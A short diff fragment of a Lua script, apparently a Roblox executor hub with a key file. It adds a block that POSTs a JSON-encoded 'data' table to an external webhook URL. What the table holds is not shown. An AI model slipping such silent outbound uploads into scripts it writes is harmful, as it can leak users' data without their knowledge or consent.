@@ -853,6 +853,15 @@ local data = {
     }}
 }
 
+local response = request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game:GetService("HttpService"):JSONEncode(data)
+})
+
 local folderName = "Axiom'sHub"
 local fileName = "key.txt"
 local filePath = folderName .. "/" .. fileName
